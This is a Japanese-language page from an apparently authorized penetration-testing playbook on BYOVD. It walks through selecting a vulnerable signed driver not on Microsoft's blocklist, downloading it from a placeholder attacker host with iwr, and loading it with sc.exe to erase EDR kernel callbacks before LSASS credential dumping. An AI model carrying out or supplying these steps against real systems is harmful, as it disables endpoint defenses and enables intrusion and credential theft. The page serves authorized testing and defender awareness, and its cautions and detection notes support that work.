# BYOVD（Bring Your Own Vulnerable Driver）

> **スコープ**: EDR がカーネルレベルで動作してユーザー空間の操作が全滅している場合に、既知の脆弱なドライバーをカーネルにロードして EDR の Kernel Callback を無効化する。ドライバー選定〜ロード〜カーネル操作〜原状回復まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（カーネル空間での操作はシステムクラッシュ・BSOD の直接原因になりえる。業務停止リスク最高）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（Driver Signature Enforcement の無効化、カーネルコールバック削除は再起動しないと戻らない場合がある）
> - [x] SIEM/EDR で確実に検知される（Sysmon Event ID 6 カーネルドライバーロード / Defender for Endpoint「Vulnerable driver load」）
>
> 実施可否は**書面承認必須**。対象組織の変更管理プロセスへの事前登録を強く推奨する。**カーネル空間の操作 = 業務停止リスク最高のため、演習環境でのみ自由に実施してよい。**

## 着火条件

以下のいずれかが成立し、かつ EDR がカーネルレベルで動作しており通常の Potato 系 / AMSI バイパス / EXE 実行がすべてブロックされる場合：

- ターゲットが管理者権限（または SeLoadDriverPrivilege）を持つアカウントのコンテキストで動いている
- EDR ドライバー（CrowdStrike Falcon / SentinelOne Agent 等）が Kernel Callback を登録しており、ユーザー空間からの AMSI バイパス・プロセスインジェクションがことごとく検知・ブロックされる

## 環境前提
- 実行環境: ターゲット（Windows シェル内）。管理者権限または `SeLoadDriverPrivilege` が必要
- 必要なツール: `sc.exe`（Windows 標準搭載）/ 脆弱なドライバー `.sys` ファイル（LOLDrivers.io から特定・別途転送要）
- 外部リソース依存: LOLDrivers.io（https://www.loldrivers.io/）/ Microsoft の Vulnerable Driver Blocklist（事前に参照が必要）

## 先に確認すること

| 確認項目 | コマンド | 判断 |
|---------|---------|------|
| 管理者権限の有無 | `whoami /groups \| findstr "S-1-5-32-544"` | Administrators グループに入っていれば OK |
| SeLoadDriverPrivilege | `whoami /priv \| findstr SeLoad` | Enabled であれば直接使える |
| Secure Boot の状態 | `Confirm-SecureBootUEFI` | True の場合はカーネルドライバー操作がより制限される |
| 現在のドライバー一覧 | `driverquery /fo csv \| findstr /i "running"` | EDR ドライバー名を確認（crowdstrike / sentinelone / carbon 等）|

**攻撃者の思考トレース:** カーネルレベルの EDR は PsSetCreateProcessNotifyRoutine / ObRegisterCallbacks 等の Kernel Callback でプロセス生成・スレッド注入を監視する。BYOVD はこの監視をカーネル内から解除することで、EDR の目を無効化する。脆弱なドライバーを正規の署名付きドライバーとしてロードし、その脆弱性を突いてカーネルに任意コードを実行させる。

---

## 1. 脆弱なドライバーの選定

LOLDrivers.io および Microsoft の Vulnerable Driver Blocklist を参照して、対象 OS バージョンで悪用可能な既知の脆弱ドライバーを選定する。

**選定基準:**

| 確認項目 | 内容 |
|---------|------|
| `CVE` / 脆弱性タイプ | `IOCTL` 経由の任意カーネルメモリ読み書き（`arbitrary read/write`）が最も汎用的 |
| OS バージョン対応 | ターゲット OS のビルド番号と一致しているか |
| ブロックリスト掲載 | Microsoft Blocklist に載っていない（Defender がブロックしない）か |
| ファイルハッシュ | LOLDrivers.io に掲載されているハッシュ値と転送前に照合する |

**観測される出力 → 次のアクション:**

| シグナル | 判断 |
|---------|------|
| EDR ドライバーが `Running` の状態で AMSI パッチ・PS インジェクションが全滅 | BYOVD の着火条件成立。ドライバーの選定へ |
| Secure Boot: True かつ HVCI（Hypervisor-Protected Code Integrity）が有効 | カーネルモードコードは MS の署名が必要。BYOVD 系ドライバーでは通らない場合がある |
| 管理者権限なし | SeLoadDriverPrivilege もなければ BYOVD は不可。UAC バイパスや昇格を先に行う |

---

## 2. ドライバーのロード（sc.exe 使用）

**事前準備（必須）:** ドライバー `.sys` ファイルをターゲットに転送しておく（HTTP サーバー経由または evil-winrm upload）。

**コマンド:**

```powershell
# [Target] ドライバーをターゲットに転送（HTTP サーバーから）
iwr "http://[ATTACKER_IP]:8888/[DRIVER_NAME].sys" -OutFile "C:\Windows\Temp\[DRIVER_NAME].sys"
```

```cmd
:: [Target] sc.exe でドライバーをカーネルサービスとして登録・起動
sc.exe create [SVC_NAME] type= kernel start= demand binPath= "C:\Windows\Temp\[DRIVER_NAME].sys"
sc.exe start [SVC_NAME]
:: "service started successfully" が出ればロード成功
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[SC] StartService SUCCESS` | カーネルにロード成功 | §3 カーネル操作へ |
| `ERROR 1275: ... driver could not be loaded` | ブロック（Blocklist / Secure Boot / DSE）| LOLDrivers.io で別のドライバーを選定する |
| EDR が即ブロック | ELAM が Blocklist をリアルタイムチェック | ブロックリスト未掲載の脆弱ドライバーを選定する |

---

## 3. 脆弱性を利用したカーネル操作

**操作タイプ別の典型的な目的:**

| 操作タイプ | 目的 | 典型的な効果 |
|-----------|------|-----------|
| 任意カーネルメモリ書き込み | EDR の Kernel Callback ポインタを NULL に書き換える | EDR がプロセス生成を検知できなくなる（無効化）|
| 任意カーネルメモリ読み取り | EDR ドライバーのメモリからシークレット・設定を抽出 | 検知ルール構造の把握 |
| カーネル空間でのコード実行 | SYSTEM 権限でカーネルモードコードを走らせる | 任意の権限昇格・プロセス隠蔽 |

**EDR の Kernel Callback 削除（概念）:**

1. `PsSetCreateProcessNotifyRoutine` / `ObRegisterCallbacks` で EDR が登録したコールバック配列のアドレスをカーネルメモリから読み取る
2. 脆弱ドライバーの任意書き込み IOCTL を使って、コールバックポインタを NULL に書き換える
3. 以降はプロセス生成・オブジェクトアクセスが EDR に通知されなくなる

> 具体的なエクスプロイトコードはドライバーごとに異なる。LOLDrivers.io のリンク先 PoC / GitHub を参照すること。

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| EDR がプロセス生成を検知しなくなる | Kernel Callback 無効化成功 | 通常の LSASS ダンプ等を実行 → `Credential_Dumping.md` / `Privilege_Tokens.md` |

---

## 4. 目的達成後のドライバーアンロード（原状回復）

**コマンド:**

```cmd
:: [Target] ドライバーを停止・削除
sc.exe stop [SVC_NAME]
sc.exe delete [SVC_NAME]
del C:\Windows\Temp\[DRIVER_NAME].sys
```

**原状回復チェックリスト:**

- ✅ `sc.exe stop / delete` でサービスを削除
- ✅ `.sys` ファイルをターゲットから削除
- ✅ `driverquery` で `[SVC_NAME]` が一覧から消えたことを確認
- ✅ Kernel Callback を NULL に書き換えた場合は**再起動が必須**（コールバック配列は再起動時に EDR が再登録する）

---

## 刺さらなかったとき（全体）

| 現象 | 原因 | 代替 |
|------|------|------|
| `sc.exe start` で ERROR 1275 | Microsoft Vulnerable Driver Blocklist に掲載されているドライバー | LOLDrivers.io で別のドライバーを選定する |
| ドライバーはロードできたが IOCTL が失敗 | OS バージョン / カーネルオフセットの不一致 | PoC を別バージョン対応のものに切り替える |
| Secure Boot + HVCI が有効 | カーネルモードコードは MS の署名が必要。BYOVD 系ドライバーでは通らない場合がある | HVCI の状態を確認し、代替手法（ユーザー空間攻撃）を検討する |

---

## 注意点・落とし穴

- Kernel Callback の書き換え失敗・ドライバーの不具合によりカーネルパニック（BSOD / システム停止）が発生するリスクがある
- ミッションクリティカルなシステムへの実施は原則禁止

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。カーネル空間での操作はシステムクラッシュ（BSOD / システム停止）の直接原因となりえる。業務停止リスクが全攻撃手法中で最高クラス
- **想定されるSIEM/EDR検知**: Sysmon Event ID 6（Driver Loaded）/ Event ID 7045（New Service Installed）/ Defender for Endpoint「Vulnerable driver load」/ CrowdStrike / SentinelOne の「Potential BYOVD Activity」アラート
- **業務影響リスク**: **最高**。Kernel Callback の書き換え失敗・ドライバーの不具合によりカーネルパニックが発生するリスクがある
- **原状回復必須項目**: ✅ `sc.exe stop / delete` でドライバーサービスを削除 / ✅ ターゲットから `.sys` ファイルを削除 / ✅ Kernel Callback を書き換えた場合は再起動を実施
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：EDR がユーザー空間の AMSI バイパス・Potato 系をブロックし、代替手段が必要 → `Enumeration_Checklist.md`
- 前：SeLoadDriverPrivilege の確認 → `Enumeration_Checklist.md`
- 後：カーネルコールバック削除後に EDR が無効化されたら通常の LSASS ダンプ等を実行 → `Privilege_Tokens.md` / `Credential_Dumping.md`
